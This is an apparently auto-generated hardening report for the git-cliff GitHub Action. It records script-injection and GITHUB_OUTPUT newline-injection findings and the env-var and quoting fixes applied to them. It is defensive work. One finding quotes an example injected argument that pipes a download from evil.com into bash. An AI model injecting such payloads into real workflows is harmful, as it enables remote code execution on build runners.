<!-- markdownlint-disable -->

# Hardening Report: orhun--git-cliff-action/v4.8.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **orhun--git-cliff-action/v4.8.0** was hardened automatically. 4 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Direct expression interpolation in a run: block. In action.yml, the 'Run git-cliff' step interpolates `${{ inputs.config }}` and `${{ inputs.args }}` directly into the shell command string: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`. Both inputs are attacker-controlled and are expanded by the GitHub Actions template engine before the shell parses the command, enabling arbitrary command injection (e.g., a malicious `args` value of `; curl http://evil.com | bash` would execute directly). These values must be passed via env vars and double-quoted in the script instead.

Locations:

- `action.yml:42`

### github-env-injection (severity: high)

run.sh writes values derived from attacker-controlled inputs to $GITHUB_OUTPUT without sanitization (no `printf '%s' ... | tr -d '\n\r'` step). Specifically: (1) `cat "$OUTPUT" >> $GITHUB_OUTPUT` writes the full changelog file content — $OUTPUT is set from CLI args originating from `${{ inputs.args }}`/`${{ inputs.config }}` — allowing newline injection to poison subsequent GITHUB_OUTPUT entries; (2) `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` writes the unsanitized $OUTPUT path; (3) `echo "version=$(jq -r '.[0].version' $CONTEXT)" >> $GITHUB_OUTPUT` writes unsanitized jq output from git-cliff's context JSON. An attacker who can influence the repository's git tags or commit messages (which git-cliff processes) could inject newlines to set arbitrary GITHUB_OUTPUT variables.

Locations:

- `run.sh:63`
- `run.sh:64`
- `run.sh:68`
- `run.sh:71`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:45`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, github-env-injection

**Notes:**

Fixed two categories of findings:

1. action.yml (script-injection / static-inline-injection): Moved `${{ inputs.config }}` and `${{ inputs.args }}` from the `run:` command line into the `env:` block as `GIT_CLIFF_CONFIG` and `GIT_CLIFF_ARGS`. The `run:` line now simply calls `${GITHUB_ACTION_PATH}/run.sh` with no inline template expressions.

2. run.sh (github-env-injection): Updated the script to (a) read config and args from env vars instead of positional args, (b) tokenize the `GIT_CLIFF_ARGS` list input using xargs to preserve argument boundaries and handle quoted sub-arguments, (c) sanitize the `changelog` output path with `printf '%s' "$OUTPUT" | tr -d '\n\r'` before writing to GITHUB_OUTPUT, and (d) sanitize the `version` output from jq with the same pattern, capturing the raw value first then sanitizing separately to preserve errexit semantics.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed unquoted variable expansion in run.sh at line 30. Changed `mkdir -p "$(dirname $OUTPUT)"` to `mkdir -p "$(dirname "$OUTPUT")"`. The `$OUTPUT` variable was unquoted inside the command substitution, allowing shell metacharacters from attacker-controlled input (via `GIT_CLIFF_ARGS` → `inputs.args`) to be interpreted by the shell. Proper quoting prevents word splitting and glob expansion.

